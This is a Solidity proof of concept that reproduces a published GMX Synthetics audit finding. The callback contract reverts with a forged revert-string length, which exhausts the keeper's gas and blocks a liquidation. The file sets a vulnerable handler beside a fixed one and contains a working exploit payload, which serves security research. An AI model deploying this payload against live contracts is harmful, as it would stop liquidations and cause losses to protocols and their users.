// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  GMX Synthetics — H-8 faked revert-string length (Sherlock 2023-02-gmx,
    finding 18634). SYNTHETIC, cheatcode-free.

    ErrorUtils.getRevertMessage abi.decodes a memory blob as a string and
    never checks the length word against the bytes that were actually
    returned. A callback can revert with ~100 bytes whose length word is
    100_000_000_000. The callback itself spends a few hundred gas, inside
    the gas stipend. The keeper's catch then tries to allocate that string
    and the execute runs out of gas, so the liquidation does not seize the
    collateral.

    The control rejects a stated length that is larger than the revert
    bytes (or larger than 256) and then executes the order. */

address constant INSURANCE_FUND = 0x3333333333333333333333333333333333333333;
uint256 constant FAKED_STRING_LENGTH = 100_000_000_000;

library ErrorUtils {
    // Verbatim from gmx-synthetics/contracts/utils/ErrorUtils.sol.
    function getRevertMessage(bytes memory result) internal pure returns (string memory, bool) {
        if (result.length < 68) {
            return ("", false);
        }

        bytes4 errorSelector = getErrorSelectorFromData(result);

        if (errorSelector == bytes4(0x08c379a0)) {
            assembly {
                result := add(result, 0x04)
            }

            // @> VULN: abi.decode trusts the length word of a memory blob and will try to allocate it
            return (abi.decode(result, (string)), true);
        }

        return ("", false);
    }

    function getErrorSelectorFromData(bytes memory data) internal pure returns (bytes4) {
        bytes4 errorSelector;
        assembly {
            errorSelector := mload(add(data, 0x20))
        }
        return errorSelector;
    }

    // Recommended bound: if the stated length is past the returned bytes, or
    // above a small cap, do not allocate. The order execution then continues.
    function getRevertMessageCapped(bytes memory result) internal pure returns (string memory, bool) {
        if (result.length < 68) {
            return ("", false);
        }
        if (getErrorSelectorFromData(result) != bytes4(0x08c379a0)) {
            return ("", false);
        }
        uint256 stated;
        assembly {
            stated := mload(add(result, 68))
        }
        if (stated > 256 || stated + 68 > result.length) {
            return ("", false);
        }
        assembly {
            result := add(result, 4)
        }
        return (abi.decode(result, (string)), true);
    }
}

interface IOrderCallbackReceiver {
    function afterOrderExecution(bytes32 key, uint256 collateral) external;
}

contract CollateralToken {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Revert payload from the Sherlock PoC: 100 bytes, length word 100_000_000_000.
contract FakedLengthCallback is IOrderCallbackReceiver {
    function afterOrderExecution(bytes32, uint256) external pure {
        assembly {
            let p := mload(0x40)
            mstore(p, 0x08c379a000000000000000000000000000000000000000000000000000000000)
            mstore(add(p, 4), 32)
            mstore(add(p, 36), 100000000000) // FAKED_STRING_LENGTH
            mstore(add(p, 68), "Unauthorizedzzzzzz")
            revert(p, 100)
        }
    }
}

contract OrderHandler {
    uint256 public constant CALLBACK_GAS = 10_240;
    uint256 public constant KEEPER_GAS = 400_000;
    uint256 public constant COLLATERAL = 1000 ether;
    event AfterOrderExecutionError(bytes32 key, string reason, bool hasReason);

    CollateralToken public collateral;
    mapping(bytes32 => bool) public filled;
    mapping(address => uint256) public locked;
    address public callback;
    address public account;
    bytes32 public positionKey;
    bool public seized;

    constructor(CollateralToken collateral_, address callback_) {
        collateral = collateral_;
        callback = callback_;
    }

    function keeperGas() public pure returns (uint256) {
        return KEEPER_GAS;
    }

    function openPosition(address account_) external returns (bytes32 key) {
        account = account_;
        key = keccak256(abi.encode(account_, COLLATERAL));
        positionKey = key;
        collateral.mint(address(this), COLLATERAL);
        locked[account_] += COLLATERAL;
    }

    function executeLiquidation(bytes32 key) external {
        _callback(key);
        _seize(key);
    }

    function _callback(bytes32 key) internal virtual {
        try IOrderCallbackReceiver(callback).afterOrderExecution{gas: CALLBACK_GAS}(key, COLLATERAL) {}
        catch (bytes memory reasonBytes) {
            (string memory reason, bool hasReason) = ErrorUtils.getRevertMessage(reasonBytes);
            emit AfterOrderExecutionError(key, reason, hasReason);
        }
    }

    function _seize(bytes32 key) internal {
        filled[key] = true;
        uint256 amount = locked[account];
        locked[account] = 0;
        collateral.transfer(INSURANCE_FUND, amount);
        seized = true;
    }
}

contract OrderHandlerFixed is OrderHandler {
    constructor(CollateralToken collateral_, address callback_) OrderHandler(collateral_, callback_) {}

    function _callback(bytes32 key) internal override {
        try IOrderCallbackReceiver(callback).afterOrderExecution{gas: CALLBACK_GAS}(key, COLLATERAL) {}
        catch (bytes memory reasonBytes) {
            (string memory reason, bool hasReason) = ErrorUtils.getRevertMessageCapped(reasonBytes);
            emit AfterOrderExecutionError(key, reason, hasReason);
        }
    }
}

contract Exploit {
    address public constant ACCOUNT = 0x1111111111111111111111111111111111111111;

    CollateralToken public token; // nonce 1
    FakedLengthCallback public callback; // nonce 2
    OrderHandler public handler; // nonce 3

    bytes32 public positionKey;
    bool public batchOk;
    uint256 public revertLen;
    uint256 public statedLen;
    uint256 public stillLocked;
    bool public wasSeized;
    uint256 public vaultBalance;
    uint256 public insuranceBalance;

    bool public controlOk;
    uint256 public controlVault;
    uint256 public controlInsurance;
    bool public controlSeized;

    constructor() {
        token = new CollateralToken();
        callback = new FakedLengthCallback();
        handler = new OrderHandler(token, address(callback));
    }

    function run() external {
        _probe();
        positionKey = handler.openPosition(ACCOUNT);
        uint256 budget = handler.keeperGas();
        (bool ok,) = address(handler).call{gas: budget}(
            abi.encodeWithSelector(handler.executeLiquidation.selector, positionKey)
        );
        batchOk = ok;
        stillLocked = handler.locked(ACCOUNT);
        wasSeized = handler.seized();
        vaultBalance = token.balanceOf(address(handler));
        insuranceBalance = token.balanceOf(INSURANCE_FUND);
        require(revertLen == 100, "revert payload is not the short fake");
        require(statedLen == FAKED_STRING_LENGTH, "length word was not faked");
        require(!batchOk, "liquidation did not run out of gas");
        require(!wasSeized, "liquidation seized the collateral");
        require(stillLocked == handler.COLLATERAL(), "collateral was not left locked");
        require(vaultBalance == handler.COLLATERAL(), "vault does not hold the 1000");
        require(insuranceBalance == 0, "insurance was paid");
    }

    function runControl() external {
        OrderHandlerFixed fixedHandler = new OrderHandlerFixed(token, address(callback));
        bytes32 key = fixedHandler.openPosition(ACCOUNT);
        uint256 budget = fixedHandler.keeperGas();
        (bool ok,) = address(fixedHandler).call{gas: budget}(
            abi.encodeWithSelector(fixedHandler.executeLiquidation.selector, key)
        );
        controlOk = ok;
        controlSeized = fixedHandler.seized();
        controlVault = token.balanceOf(address(fixedHandler));
        controlInsurance = token.balanceOf(INSURANCE_FUND);
        require(ok, "control liquidation reverted");
        require(controlSeized, "control did not seize");
        require(controlVault == 0, "control left funds in the handler");
        require(controlInsurance == fixedHandler.COLLATERAL(), "insurance was not paid 1000");
    }

    function _probe() internal {
        try callback.afterOrderExecution{gas: 10_240}(bytes32(0), 0) {}
        catch (bytes memory reason) {
            revertLen = reason.length;
            uint256 stated;
            assembly {
                stated := mload(add(reason, 68))
            }
            statedLen = stated;
        }
    }
}
